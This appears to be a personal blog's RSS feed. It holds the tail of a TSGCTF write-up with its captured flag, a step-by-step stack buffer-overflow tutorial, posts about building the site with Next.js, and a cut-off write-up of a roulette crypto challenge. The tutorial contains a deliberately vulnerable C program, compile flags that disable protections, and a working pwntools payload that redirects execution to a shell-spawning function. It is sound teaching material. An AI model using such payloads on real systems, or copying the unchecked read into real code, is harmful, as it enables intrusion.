<pre><code>ls
chal
flag-5f58d5916588b60b33a904537af3a564.txt
start.sh
</code></pre>
<p>After running <code>ls</code> we can see that the flag is right there. With the use of a wildcard to avoid having to write in all those numbers, we can <code>cat</code> into the flag:</p>
<pre><code>cat f*
TSGCTF{6O7_4nd_6lob4l_v4r1able5_ar3_4dj4c3n7_1n_m3m0ry_67216011}
</code></pre>
<p>That's it!</p>
<h2>Conclusion</h2>
<p>The key of this challenge was that global variables tend to be close to the PLT/GOT region of our binary. If the binary isn't properly protected, nothing stops us from modifying the values of our global variables or PLT entries. This is where the vulnerability lied. By overwriting certain entries and creating our own argument in <code>msg</code> to open a shell, we've managed to turn a seemingly harmless function into one that granted us access to the server.</p>
]]></description>
            <link>https://markelmencia.github.io/writeups/tsgctf2025-global-writer-writeup</link>
            <guid isPermaLink="true">https://markelmencia.github.io/writeups/tsgctf2025-global-writer-writeup</guid>
            <pubDate>Sun, 21 Dec 2025 00:00:00 GMT</pubDate>
        </item>
        <item>
            <title><![CDATA[How to perform a simple buffer overflow]]></title>
            <description><![CDATA[<h1>How to perform a simple buffer overflow</h1>
<h4>December 18, 2025</h4>
<p>Buffer Overflow attacks are one of the most common types of attacks, and it has been so for the last decade. Unfortunately, they tend to be quite powerful, granting in some cases full system control to the attacker due to how close to the bare-metal these attacks tend to be performed on. BOFs have been in the cybersecurity scene for decades, giving headaches to security experts and full-on companies alike. And even if language compilers have worked to prevent these attacks and many tools have been developed to detect related issues, buffer overflows are definitely still a thing of the present.</p>
<p>Knowing how these vulnerabilities are created, or at least understanding their roots is knowledge that might be quite useful for any developer, even if they are not specialized in the cybersecurity space.</p>
<p>As I'll be participating in a CTF competition this weekend, I decided to refresh my memory on how these vulnerabilities come to be, because I find them very interesting. As I've mentioned, they are quite close to the bare-metal (in order to perform a buffer overflow attack, we'll need to be in contact with assembly!). Because of this, it can be overwhelming to perform a BOF attack (let alone understand it). Moreover, there are many tools to choose from. This is why I'm writing this. This is a small tutorial in which I'll show how an attack is done from scratch. Let's get on with it!</p>
<h2>The big picture</h2>
<p>Before we dive into code, first we have to understand how these vulnerabilities come to be.</p>
<p>When a function is executing code, said function can read/write values in both local or global variables or arrays. Global variables are stored in the program memory, but since local variables are only meant to be read or written inside one function, these get stored elsewhere: the call stack.</p>
<h3>The call stack</h3>
<p>The call stack (we'll be calling it stack from now on) is the data structure used for storing local variables inside a function. During the function runtime, different instructions will interact with the stack. A stack contains some blocks that store data. You might think of a stack as an array, but they have a very important distinction: a stack is a LIFO structure (Last In First Out). Think of it as a pile of books: you form a "tower" of books by placing them on top of each other, one by one. The first book you placed will be on the bottom, and the last one will be on the top. The same applies with a stack, you add (<strong>Push</strong>) data on top of other data. In order to get the first value you pushed, you'll need to <strong>Pop</strong> the values above it until you get to the one you want.</p>
<p>A function works the same way with local variables, they are pushed and popped in and out of the stack. But local variable values are not the only thing stored in the stack!</p>
<h3>How do functions work?</h3>
<p>We all know what functions are. But have you ever wondered how they work on the inside?</p>
<p>Programs are a set of ordered instructions. These instructions are stored in memory, and the program runs through them. Each program has a pointer that stores the address of the next function that will be executed.</p>
<pre><code>> 0x0001: add x1, x2, x3
0x0002: sub x3, x2, x1
0x0003: add x4, x7, x1

RIP: 0x0002
</code></pre>
<p>In this example, the instruction pointer (RIP, Register Instruction Pointer) points to the address 0x0002. This means that the next instruction that will be executed will be the <strong>sub</strong> instruction.</p>
<pre><code>0x0003: add x2, x4, x1
> 0x0004: jmp 0xAEAE
0x0005: add x4, x4, x3

RIP: 0xAEAE
</code></pre>
<p>The code we write can dictate what instruction will be executed next, as we can see in this example. <strong>jmp</strong> is a jump instruction, that will jump to the address specified, in this case 0xAEAE.</p>
<p>In order to run functions, two things will happen:</p>
<pre><code>_start:
	call a_function
	sub x3, x2, x1
	
a_function:
	add x1, x2, x3
	ret
</code></pre>
<p>This code will call the function <code>a_function</code> using the instruction <code>call</code>. <code>call</code> does two things:</p>
<ol>
<li>The address of the next instruction after <code>call</code> (in this case <code>sub</code>) will be <strong>pushed into the stack</strong>.</li>
<li>The code modifies the value of the instruction pointer to the address of the function called (in this case <code>a_function</code>).</li>
</ol>
<p>Pushing the return address (the address of <code>sub</code>) to the stack is necessary because the function needs to know where to return once the <code>ret</code> instruction is reached.  Additionally, we know that the return address will always be at the bottom of the stack, because it is the first value that gets pushed into it. <code>ret</code> essentially gets the value by popping it, and jumps into it, to make the program run the code after the <code>call</code> instruction. Either way, we can see that the return address is stored in the same place where the local variables of the function get stored, the stack.</p>
<h2>The issue</h2>
<p>Now that we've seen that the return address of a function and its local data share space, one could think that there could be a way to somehow overwrite the return value. Let's not think about the how for now, but about the why this could be catastrophic.</p>
<p>If we overwrite the return value, this would mean that once the function finishes, the program would jump to that overwritten address. If we change that stack position to store an address of a malicious function (one that, for example would grant us access to a shell), <code>ret</code> would jump to that address, in which dangerous code would be executed, with which we could potentially take over the system. Pretty metal.</p>
<p>This is achieved with a properly orchestrated <strong>Buffer Oveflow</strong>.</p>
<h2>Overflowing the stack</h2>
<p>Imagine that we have a local array in a function. This array is used to temporally store some data (a buffer), and it has a fixed size of five. The stack would look something like this:</p>
<p><img src="/img/posts/bof-stack.png" alt="A stack example"></p>
<p>Since the buffer is 5 elements long (let's not care about what type is it storing for now), the stack will only assign five blocks for it. If we somehow add more than five elements to the array, we could overflow the stack:</p>
<p><img src="/img/posts/bof-stack-of.png" alt="An overflowed stack"></p>
<p>Notice how where the return address was, now there is the 6th element of the buffer. We've overwritten the return address. If we manage to control what exactly <code>buf[6]</code> is, we'll be able to make the function return to wherever we tell it to, for example malicious code.</p>
<p>These are the fundamentals of a buffer overflow. Now, let's learn how to make it work with code.</p>
<h2>The code</h2>
<p>I wrote this simple example to showcase how a buffer overflow is done:</p>
<pre><code class="language-c">#include &#x3C;stdio.h>
#include &#x3C;unistd.h>
#include &#x3C;stdlib.h>

void exploit() {
	printf("Exploit function executed\n");
	system("/bin/sh"); // Opens a shell instance, giving us system access
}

void unsafe() {
	printf("Enter a string:\n");
	char buffer[16] = {0};
	read(0, buffer, 50);
	return;
}

int main() {
    unsafe();
	return 0;
}
</code></pre>
<p>Take a look at the main function. It calls <code>unsafe()</code>, which asks for input, stores it in a buffer and then returns, finishing the program. However, we can see a function called <code>exploit()</code>, which is defined but is never called. This function, as can be seen, would allow us to open a shell with that program, ideally granting us access to other parts of the system.</p>
<p>Our goal is to call this function. As we've seen in the visual example before, if we know the address in which this function starts, and we manage to create a buffer overflow in the unsafe function (which is, as a matter of fact, unsafe), we'll be able to run the <code>exploit()</code> function.</p>
<h2>A important caveat</h2>
<p>If you compile this source file with the regular <code>gcc unsafe.c -o unsafe</code>, eventually you'll realize that you won't be able to perform the overflow. This is because compilers have gone a long way in terms of offering binary security by default. The gcc compiler, without you having to worry about it, adds some layers of security to your programs, such as randomizing function addresses, removing execution permissions from the stack, and more.</p>
<p>In order to actually perform a buffer overflow with this program, we'll have to disable some of these measures. You might wonder what's the point to execute a vulnerable program in an already vulnerable environment. Well, firstly, this is just a showcase. CTF challenges often turn off these measures too. And again, let me remind you that even with these options off, buffer overflows have been the most common type of attack this past decade.</p>
<p>With this out of the way, here's the command we'll use for compiling:</p>
<pre><code class="language-bash">$ gcc unsafe.c -o unsafe -fno-stack-protector -no-pie -z execstack
</code></pre>
<h2>Running the binary</h2>
<p>With the binary ready to go, we can begin making tests:</p>
<pre><code class="language-bash">$ ./unsafe
Enter a string:
hello world
$
</code></pre>
<p>Nothing out of the ordinary. We type "hello world" and the input gets copied into the buffer. Before doing anything else, let's look back at the code, maybe you have already figured what's wrong with it:</p>
<pre><code class="language-c">void unsafe() {
	printf("Enter a string:\n");
	char buffer[16] = {0};
	read(0, buffer, 50);
	return;
}
</code></pre>
<p>It doesn't take long to notice that the buffer size (16) is much smaller than the amount of characters that are read from the standard input (50). This will copy the content of the input to the buffer, but it will NOT stop at the maximum length of the buffer. Each character will be pushed into the stack, but the stack won't grow longer because the buffer size was meant to be 16, no more. This will overwrite values in the stack, and if the input was long enough, it could even reach the return address and overwrite it too.</p>
<pre><code class="language-bash">$ ./unsafe
Enter a string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
$
</code></pre>
<p>Notice how if we type in a bigger input, a segmentation fault raises. Segmentation faults are not exactly verbose without the proper tools, so executing this binary in a plain shell won't really give us much information.</p>
<h2>The tools we'll use</h2>
<p>Binary exploitation is very difficult without tools that help us debug or prepare exploits. There are plenty out there, but for this article I'll use two.</p>
<h3>pwndbg</h3>
<p>pwndbg is a GDB (GNU Debugger) extension that eases binary exploitation. We'll see its uses along the way. <a href="https://pwndbg.re/stable/setup/">Installing it</a> is quite easy.</p>
<h3>pwntools</h3>
<p>If you're slightly into the CTF world, you've surely used this framework before. In this case, we'll use to it generate the proper input to exploit the binary. <a href="https://docs.pwntools.com/en/stable/install.html">The installation</a> is also pretty easy.</p>
<h2>The exploit</h2>
<p>Let's run the program again, but this time inside pwndbg:</p>
<pre><code class="language-bash">$ pwndbg unsafe
pwndbg> run
Enter a string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</code></pre>
<p>Once we hit enter, the segmentation fault will happen again, obviously. But this program will be able to give us more information about it:</p>
<p><img src="/img/posts/bof-pwndbg.png" alt="After-execution status"></p>
<p>The REGISTERS tab prints out the content of each register in the CPU the moment the segmentation fault happened. DISASM tells us what was the last instruction executed.</p>
<p>And then we see the stack:
<img src="/img/posts/bof-pwndbg-stack.png" alt="After-execution status"></p>
<p>This is a snapshot of the stack the moment the segmentation fault happened. Does something look familiar? We've successfully overflowed the buffer! This execution has made it so other parts of the stack have been filled with A's. And not only that, but we've also managed to change the return address of the function. We can see this in DISASM:</p>
<p><img src="/img/posts/bof-pwndbg-disasm.png" alt="DISASM information"></p>
<p>The ret instruction tried to jump to the address 0x414141..., but it wasn't able to because that address wasn't inside the memory scope of the program. Because of that, a segmentation fault raised: it was trying to access memory that wasn't theirs.</p>
<p>The only thing that's left is to know exactly how many A's we need to include in order to reach the return address block of the stack, and then type the address to the <code>exploit()</code> function. We are quite close, so let's get on with it.</p>
<h2>Patterns</h2>
<p>An easy way to know where exactly the return address is stored on in the stack is by using a string pattern. This is a string that follow a specific pattern that it's easy to trace. pwndbg offers a tool just for that. Let's reopen it:</p>
<pre><code>$ pwndbg unsafe
pwndbg>
</code></pre>
<p>First we need to generate the pattern and store it in a file. We don't really need to know how the pattern works, pwndbg does it for us. This is how it's done:</p>
<pre><code>pwndbg> cyclic 200 pat
Written a cyclic sequence of length 200 to file pat
</code></pre>
<p>Now we have a file that contains this cyclic pattern, named "pat". It's 200 characters long, which is more than enough. Let's run the program with this pattern as input with a redirection:</p>
<pre><code>pwndbg> run &#x3C; pat
</code></pre>
<p><img src="/img/posts/bof-pwndbg-disasm-pattern.png" alt="DISASM information with pattern"></p>
<p>Not much has changed, the overflow still happened. The difference is that this pattern is traceable. With a simple command we can find the position of any part of that pattern, meaning that if we plug in the part of the pattern that ended up in the return address (0x6161...64), we'll know the offset we need:</p>
<pre><code>pwndbg> cyclic -l 0x6161616161616164
Finding cyclic pattern of 8 bytes: b'daaaaaaa' (hex: 0x6461616161616161)
Found at offset 24
</code></pre>
<p>That's the offset! This means that we need to type in 24 A's (or any character), and after that we'll get to the return address block.</p>
<h2>Getting the exploit function address</h2>
<p>We now know <em>where</em> we need to input the exploit function address, but we still don't know what that address is. To get it, we can use pwndbg as well:</p>
<pre><code>pwndbg> info functions
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  system@plt
0x0000000000401050  read@plt
0x0000000000401060  _start
0x0000000000401090  _dl_relocate_static_pie
0x00000000004010a0  deregister_tm_clones
0x00000000004010d0  register_tm_clones
0x0000000000401110  __do_global_dtors_aux
0x0000000000401140  frame_dummy
0x0000000000401146  exploit
0x000000000040116b  unsafe
0x00000000004011ab  main
0x00000000004011c0  _fini
</code></pre>
<p><code>info functions</code> prints out the address of every function in our code. Let's write down the <code>exploit</code> function address.</p>
<p>There's a small intricacy, though. We need one more address. This binary was compiled to be executed on a 64-bit architecture. Due to some optimizations made by the C library for 64-bit machines, and the fact that we will be executing a function (<code>exploit</code>) without calling it with <code>call</code>, we need to "align" the stack. There isn't a lot of information about this online, and the details aren't too important, so I'll leave it up to you if you want to inform yourself more on this, but what we need is to simulate a "double return". Instead of going directly to the <code>exploit()</code> function address, we'll jump into an address with another <code>ret</code> instruction on it, and this <code>ret</code> will be the one that will take us to the malicious function. For this, we just need to get the address of one <code>ret</code> instruction, and plug it right after the offset (24 A's) and before the address of <code>exploit</code>.</p>
<p>Here's how we get an address to a <code>ret</code> instruction:</p>
<pre><code>pwndbg> rop
...
0x00401016 : ret
...
</code></pre>
<p><code>rop</code> will print quite a few useful addresses we might need for other programs called "gadgets", but for this one we just need one that has "ret" on it. Let's write this address too. Now we are ready to build the exploit string.</p>
<h2>Creating the exploit string</h2>
<p>We'll use pwntools for this, and a simple python script:</p>
<pre><code class="language-python">from pwn import *

OFFSET = 24
RET_INSTRUCTION_ADDRESS = 0x00401016
EXPLOIT_FUNCTION_ADDRESS = 0x00401146

payload  = b"A"*OFFSET
payload += p64(RET_INSTRUCTION_ADDRESS)
payload += p64(EXPLOIT_FUNCTION_ADDRESS)
open("exploit", "bw").write(payload)
</code></pre>
<p>In a nutshell, this script generates a byte array with the string that has to be used as input and writes it to a file called "exploit". You just need to change the variables according to the results you've gathered with your debugging.</p>
<p>Now we're ready to go! It's time to run the program using the generated file as input:</p>
<pre><code>$ ./unsafe &#x3C; exploit
Enter a string:
Exploit function executed
$
</code></pre>
<p>Done! No segmentation faults this time, and we managed to get inside the exploit function without it being called in the source code. The process is a bit long, but I can see this becoming very mechanic with some practice. This is one of the simplest buffer overflow examples you can do. Needless to say, there are many types of buffer overflows, some more complex than others, but the foundations are the same.</p>
<p>If you want to do more CTF-style BOF challenges, there's a whole page dedicated to it: <a href="https://ropemporium.com/">ROP Emporium</a>. I'll surely be using it quite a bit these following days!</p>
<h2>Conclusion</h2>
<p>Buffer Overflows are a key exercise in cybersecurity. With them being so common, it's important to get the hang of them if you want to dive deeper into computer security.</p>
<p>One thing I haven't went over in this article is about how to avoid these vulnerabilities in our code. It turns out that at times it might not be as easy as it seems, but following some good practices is not hard, and it might save you some day. If knowing how to exploit them is important, knowing how to avoid them is much more than that! A professor I had liked to mention how code integrity shouldn't be a step in development, but a mindset throughout the whole process. Maybe the fact that this advice is ignored is precisely why these vulnerabilities are still happening so much.</p>
]]></description>
            <link>https://markelmencia.github.io/blog/how-to-perform-bof</link>
            <guid isPermaLink="true">https://markelmencia.github.io/blog/how-to-perform-bof</guid>
            <pubDate>Thu, 18 Dec 2025 00:00:00 GMT</pubDate>
        </item>
        <item>
            <title><![CDATA[Website finished: My experience overall]]></title>
            <description><![CDATA[<h1>Webpage finished: My experience overall</h1>
<h4>December 11, 2025</h4>
<p>After a long weekend of spending a considerable amount of hours designing, I've finally finished my page and deployed it!</p>
<p>As I've mentioned <a href="/blog/front-end-nightmare">in my last post</a>, I've been meaning to create a personal portfolio/blog. Using a template was not something I was intending to do this time, so I decided to create the page from scratch, by myself. This led to a handful of roadblocks and desperation, but after a few attempts, I managed to get the foundations of the page working. With that out of the way, I started the actual designing process, which is what I'll be talking about today.</p>
<h2>Working with Next.js</h2>
<p>After struggling with two other frameworks, Next.js was the one I managed to get working. In retrospect, most of my issues arose when trying to implement <a href="https://tailwindcss.com/blog/tailwindcss-typography">tailwind/typography</a>, so I could've stayed in the other two frameworks I dropped. Still, working with Next.js was alright and I didn't run into many complicated issues. I've been told that Next.js is a bit of an overkill for a static page, but it worked for me. At the end of the day, performance is not exactly a priority in a static page. I focused more on readability and related issues.</p>
<p>The component system was very intuitive and I got the hang of it pretty quickly. I'm pretty sure the components are more of a React feature, though? I'll still mention it here because quite frankly I don't know any better. Creating dynamic pages (in my case for each blog) was very simple as well, it's one of the first things I set up, and after doing so, I didn't have to think about them any more during the rest of the design process.</p>
<p>Overall, I'm satisfied with Next.js. I'm happy I got to learn the fundamentals of a framework this popular. Honestly, I don't know when or if I'll have the change to use it for a different project, but if I do, at least I'll be able to know where to start.</p>
<h2>Dealing with Tailwind</h2>
<p>After all the struggles I've had with getting Typography to work, once installed, Tailwind turned out to be very easy to work with. And not only that, but it does the work it advertises pretty well. Out of the box, after configuring it to work on my articles,  the styles it applies definitely makes the text more readable. I only had to change a few things to adapt it to my page design, so it was definitely worth the struggle. I've been told that Markdown design is not easy at all. With Tailwind, I didn't really need to worry about it much.</p>
<p>However, I'm technically not done with it. Something I haven't configured yet are codeblocks. I currently haven't written any post with code on it, so I've forgotten about them entirely. Once I need to write some code on my blog, I'll try to set it up correctly, I hope it isn't much trouble.</p>
<h2>The more-complicated features</h2>
<p>As it can be seen, my page is far from complex, but if I had to highlight what has been the hardest features to implement, I'd say the search bar and the dark mode.</p>
<h3>The search bar</h3>
<p>In the blog section, you can search blogs with the search bar. I wanted to implement this from the very beginning because I find it quite useful, and I wanted to dabble into more complex JavaScript. In the end, I actually got it working quite quickly, although it's important to mention that search bars are pretty well-documented, and finding information about them online wasn't too much of a chore.</p>
<h3>Dark/light mode</h3>
<p>This actually gave me a bunch of issues! I think my mistake was trying to do it in a CSS/JavaScript-centric approach first. I had already implemented a dark/light mode switcher for other projects with no frameworks, so I wasn't aware that there were tools for this in Next.js. After lots of attempts (and the browser cache trolling me once or twice), it works? It even changes according to your system theme, but I invite you to find the issue with it!</p>
<h2>The design itself</h2>
<p>When looking at the design, it's clear that I've inspired myself in the classic blog template design. This is because I didn't need much more than that, I wasn't looking for anything fancy. I think that for this page, I'm focusing on readability, so the less distractions there are for reading, the better. So after tinkering with different options, and the help of one of my friends with the specifics (thank you Litzy), I've managed to build something I'm quite satisfied with, and from scratch! That was my objective from the very beginning. Hopefully I've found a balance between simplicity and enough details for the page to be appealing.</p>
<p>This is all from me for now. Semester finals are next week, so I don't know if I'll have much time to write more, but after that I'll surely have some more time to work on personal projects. Christmas is right around the corner! December always passes by so quickly, so I'll try to make the most of it.</p>
<p>~ Markel</p>
]]></description>
            <link>https://markelmencia.github.io/blog/webpage-finished-my-experience</link>
            <guid isPermaLink="true">https://markelmencia.github.io/blog/webpage-finished-my-experience</guid>
            <pubDate>Thu, 11 Dec 2025 00:00:00 GMT</pubDate>
        </item>
        <item>
            <title><![CDATA[First post: Front-end nightmare]]></title>
            <description><![CDATA[<h1>First post: Front-end nightmare</h1>
<h4>December 5, 2025</h4>
<p>I have always liked system-level development better. It is what I've grown to like and hopefully what I'll keep enjoying in the future. I'm just more comfortable with low-level programming, even though admittedly, more often than not, some concepts can be anything but intuitive.</p>
<p>Regardless, sometimes I do dabble into higher-level environments for a change, especially recently because some university projects demanded so. It's something I can definitely enjoy. In a recent hackathon I participated in, I ended up designing a webapp. At that time I had no experience with JavaScript whatsoever, and learning it, albeit confusing, was quite fun.</p>
<p>More recently, I decided to try to build my own page from scratch, as a sort of portfolio, and a place where I could write about whatever I felt like. Usually, to build a page like that, you'd resort to the countless free-to-use <a href="https://hexo.io/">Hexo</a>/<a href="https://themes.gohugo.io/">Hugo</a> templates available; they're easy to set up, nice to the eye, and they let you minimize your concerns about the design side of developing a blog. They even allow you to write articles in Markdown (like this one I'm currently writing), which makes it very easy to post, even for people not accustomed to coding. I had used templates like these before, and I have no issue with them. In fact, I highly recommend their use. Nevertheless, I wanted to try something new: frameworks.</p>
<p>By all means, it was hard.</p>
<h2>Choosing a framework</h2>
<p>It's a common gag in the front-end development community to say that one of the most difficult parts of developing an application is choosing a proper framework for it. And of course, I got to experience that in my own way.</p>
<p>At first sight, one could claim that choosing a framework for my necessities (a static page with some features to ease the creation of posts) wouldn't be hard, and they'd probably be correct. But for me, it was not easy at all.</p>
<h3>Vite-SSG + Vue</h3>
<p>Bold first choice, especially considering the fact that the first time I used Vue was that very same day. I chose <a href="https://github.com/antfu-collective/vite-ssg">Vite-SSG</a> because it was light and it used Vue. I had learned the basics of Vue that very same day for an assignment, and this framework seemed like a perfect excuse to dive deeper into that framework. Futhermore, it was specialized for server-side generation pages (hence SSG), which is another name for static pages. However, I couldn't even get it running. For reasons unknown to me, the build always failed. I followed many guides that used different methods and none worked, most likely because of me. After an hour and a half of failed attempts, I gave up and went home. Needless to say, I had a lot to learn.</p>
<h3>Nuxt.js</h3>
<p>This framework seemed promising for me. It looked very well documented and from what I can gather, it's performance is remarkable. <a href="https://nuxt.com/">Nuxt.js</a> is a bigger framework than the previous one, but it also works with Vue. Again, lured by my willingness to learn Vue, I gave it a test. This time, I had more success in the setup process. The build was working, and I even began making some small designs to get more accustomed to Vue.</p>
<p>The problems started coming up when I began to implement Markdown support to the page, which is essential to what I was trying to do. It took a bunch of tinkering, but I managed to make it work: Text written in Markdown format would be translated to HTML, but there was one issue. The library I used for it only translated the format, but it had no style. That was expected, because for Markdown styling the <a href="https://tailwindcss.com/blog/tailwindcss-typography">tailwind/typography</a> library is used generally. Essentially, it provides "proses", which are predefined styles that format the text for you. Here's where everything went to waste, because again, I was unable to set it up. I'll speak more on this later.</p>
<h2>The struggle of front-end vs back-end development</h2>
<p>Empty-handed again, desperation was starting to kick in, and not in small doses! I can manage dealing with errors just fine, but only if I know where they come from. In development closer to the system-level, you can always debug more and more until you inevitably stumble across the issue. With front-end development, that might not always be the case, because there's more to it than just your code.</p>
<h3>Abstraction</h3>
<p>Abstraction is one part of it. For obvious reasons frameworks provide abstraction so that you don't need to worry about the intricacies of the lower-level side when you don't need to. However, I find that debugging becomes more challenging with abstraction because you don't necessarily know what's happening under the hood. This is why I'm often reluctant to big frameworks like <a href="https://www.djangoproject.com/">Django</a>. I acknowledge that they're powerful tools that can make you save time, but purely because of preference I rather use lighter frameworks that allow me to understand what happens under the hood better, with the price of having to write more code or having less abstraction.</p>
<h3>Version control and compatibility</h3>
<p>I have realized very quickly that the version you're running your framework on really does make or break it. Frameworks are in constant development, and making sure everything is updated or compatible with other libraries is not trivial, as it seems.</p>
<p>I wasn't at all accustomed to these factors, and it showed. I want to make clear that the reason I dropped the previously mentioned frameworks was not because they weren't useful for me or because I thought they just weren't good. I just wasn't able to make them work because I wasn't ready. Additionally, the guides I was following were probably out of date. In lower-level areas, sometimes this might not matter, because the development of these areas tends to be more stable and long-term oriented. But in the ever-changing world of frameworks, this is definitely a thing to look out for.</p>
<h2>Next.js</h2>
<p>Back again on the drawing board, I remembered that a friend specialized in web development told me that Next.js is one of the general go-tos in the framework world. Countless tutorials exist for it and it's very well documented. With no other ideas, I tried it out. I followed a <a href="https://m.youtube.com/watch?v=kffGWfZCLlE&#x26;pp=ygUjaG93IHRvIGNyZWF0ZSBhIGJsb2cgd2l0aCBtYXJrZG93biA%3D">very good tutorial</a> that covered just enough to have what I needed, allowing me to take it from there. And, sure enough, after dealing with Tailwind versions for a second time, I finally got it working!</p>
<h2>Where I'm at</h2>
<p>After two whole days of aimlessly tinkering for hours, I finally have the base for my page. I'm writing this after having finished the setup, so the truth is that I'm just getting started. Usually, the complicated part in web development is the design of the page, not the setup. The good news is that I have more experience in this area, so hopefully I'll pull through. My idea is to make a basic blog design, like the ones you'd see in <a href="https://hexo.io/">Hexo</a> or <a href="https://themes.gohugo.io/">Hugo</a>, so nothing too fancy or complicated. Hopefully I'll make something decent!</p>
<h2>What I've learned</h2>
<p>Although there's some things I yet don't understand (and I'm far from being out of the woods), I do feel like I've learned quite a bit.</p>
<p>Firstly, I can wholeheartedly say that dealing with the issues I found was very frustrating and something I wasn't at all ready for. I thought that the setup of a framework wouldn't be too difficult because the npm package manager has gone a long way and it definitely has made things easier over the years. But again, conflicting versions and different flavours of packages twisted my environments. In retrospect, I should've spent some more time making sure the versions of the libraries I was using were compatible with each other, which brings me to the next lesson.</p>
<p>I've also learned that knowing how to document yourself is one of, if not the most important skill to learn if you want to work with frameworks. Usually, this is a given for Computer Science in general, but I feel like this area in particular is the one in which this shows the most, because frameworks are in constant development, and standards and practices change because of it. Additionally, frameworks create a lot of files, many of which you don't even need to open. Generally I can handle projects with many source files, but only if I know what they do. To give some credit to frameworks, however, Nuxt does <a href="https://nuxt.com/docs/4.x/directory-structure">a really good job</a> of documenting what each file does, and how their project structure works, and those articles helped for sure.</p>
<h2>Technicality</h2>
<p>Finally, I've also experienced first-hand that front-end development is far from trivial, something I knew already but hadn't experienced. There seems to be people that believe that front-end design is not development, or that it requires less skills than other programming areas. I couldn't agree less with that. It requires thought and good decision-making, you need to be aware of the tools available and know which is best for your use cases. And this isn't taking into account all the design involved in the web development process: not only do you need to have an idea of what you want to create but you also have to know how to code it. It is true that it is a very accessible field, with lots of options and ways to learn. But developing a full-fledged web application still requires to be very aware of those tools. And let's not even mention SEO and placement! There are many variables in web development, and these need to be properly addressed if you want a good overall project. I believe that an area being less technical than other doesn't imply that it's an easier area to work on. It definitely requires a different mindset, but that doesn't mean that you'll have an easier time with it.</p>
<p>Sometimes, it is important to remember that. As someone who is more interested in research and in the more technical aspects of Computer Science, it's easy to get too caught up on the idea that you're in the cutting-edge of what we know about this field, and thinking that other areas less involved in that are "simpler" because of it. The truth is that they just require a different a skillset or motivation. One that a researcher, system administrator or Linux kernel developer might not have. And that's alright! The fun thing about Computer Science is that you'll never be able to grasp the full view. It's just that big of a field.</p>
<p>Anyway, I will continue developing my page. There's a lot to do but I'm excited to see where it ends up. My idea, as I mentioned, is to build a portfolio to showcase my projects. But I especially want to make this page to post articles about whatever I feel like writing, because it's a hobby I quite like. Designing everything myself is clearly an overkill? Absolutely, but we'll see where it ends up!</p>
<p>~ Markel</p>
]]></description>
            <link>https://markelmencia.github.io/blog/front-end-nightmare</link>
            <guid isPermaLink="true">https://markelmencia.github.io/blog/front-end-nightmare</guid>
            <pubDate>Fri, 05 Dec 2025 00:00:00 GMT</pubDate>
        </item>
        <item>
            <title><![CDATA[Break The Syntax 2025: crypto/Roulette]]></title>
            <description><![CDATA[<h1>Break The Syntax CTF 2025: crypto/roulette</h1>
<h4>May 31, 2025</h4>
<p>This challenge simulates a "Provably Fair Roulette". In order to interact with the challenge we have to connect to the server that runs it. To get the flag, according to the given description, <strong>we must get the number 13 a total of 37 times in a row</strong>. To do so, we are given the code that runs in the server.</p>
<h2>Objective</h2>
<p>Somehow manipulate our interaction with the server to <strong>hardcode the number 13 as the resulting number</strong> of the roulette.</p>
<h2>Writeup</h2>
<h3>The server</h3>
<p>Let's look at the <strong>Python script</strong> that runs in the server, to see how the winner number is generated:</p>
<pre><code>from hashlib import sha256
import secrets


def get_color(number):
    """Determine roulette color for a given number"""
    if number == 0:
        return 'green'
    return 'red' if number % 2 == 1 else 'black'

def main():
    print("Welcome to Provably Fair Roulette!")
    
    with open('flag', 'rt') as f:
        FLAG = f.read()
        
    streak_13 = 0
    while True:
        # Generate server seed and its hash
        server_seed = sha256(bytes(secrets.randbits(17))).hexdigest()
        server_seed_hash = sha256(server_seed.encode()).hexdigest()
        
	    print(f"Server seed hash (verify later): {server_seed_hash}")
        # Get client seed
        print("Enter your client seed (press enter to generate): ", end="")
        client_seed = input().strip()
        if not client_seed:
            client_seed = secrets.token_bytes(8).hex()
            print(f"Generated client seed: {client_seed}")
            
        # Generate game hash
        combined = f"{server_seed}:{client_seed}"
        game_hash = sha256(combined.encode()).hexdigest()
        hash_int = int(game_hash, 16)
        
        # Calculate roulette result
        roulette_number = hash_int % 37  # 0-36
        roulette_color = get_color(roulette_number)
		
	    # Get user's bet
        while True:
            print("Place your bet (number 0-36 or color red/black/green): ", end="")
            bet = input().strip().lower()
            if bet in ['green', 'red', 'black']:
                break
            try:
                num = int(bet)
                if 0 &#x3C;= num &#x3C;= 36:
                    bet = str(num)  # Standardize to string for comparison
                    break
                print("Number must be between 0-36")
            except ValueError:
                print("Invalid bet. Enter number (0-36) or color (red/black/green)"
        
        # Determine result
        result_str = f"{roulette_number} ({roulette_color})"
        print(f"\nThe wheel lands on: {result_str}")
        
        # Check win conditions
        win = False
        if bet.isdigit():
            win = int(bet) == roulette_number
        else:
            win = bet == roulette_color
		   
        if win:
            print("Congratulations! You win! ")
            if roulette_number == 13:
                print("...and you got 13, double congratulations!")
                streak_13 += 1
            else:
                print("But it's not 13, no streak for you")
                streak_13 = 0
        else:
            print("Sorry, you lose!")
            streak_13 = 0
	    
		# Verification information
        print()
        print("Verification Details:")
        print(f"Server seed: {server_seed}")
        print(f"Client seed: {client_seed}")
        print(f"Combined string: {combined}")
        print(f"Game hash: {game_hash}")
        print(f"Calculated number: {roulette_number}")
        print(f"Resulting color: {roulette_color}")

        if streak_13 == 37:
            print("How? How is it possible? What was the chance?! " f"Anyway, here's your flag, congratulations... {FLAG}")
            exit()

if __name__ == "__main__":
    main()
</code></pre>
<p>First it generates a server seed, which is just <strong>a random 17-bit long hexadecimal number</strong>. Then it hashes it, it prints it out to us:</p>
<pre><code># Generate server seed and its hash
server_seed = sha256(bytes(secrets.randbits(17))).hexdigest()
server_seed_hash = sha256(server_seed.encode()).hexdigest()

print(f"Server seed hash (verify later): {server_seed_hash}")
</code></pre>
<p>Then the server asks us for input. This will be our seed:</p>
<pre><code># Get client seed
print("Enter your client seed (press enter to generate): ", end="")
client_seed = input().strip()
if not client_seed:
    client_seed = secrets.token_bytes(8).hex()
    print(f"Generated client seed: {client_seed}")
</code></pre>
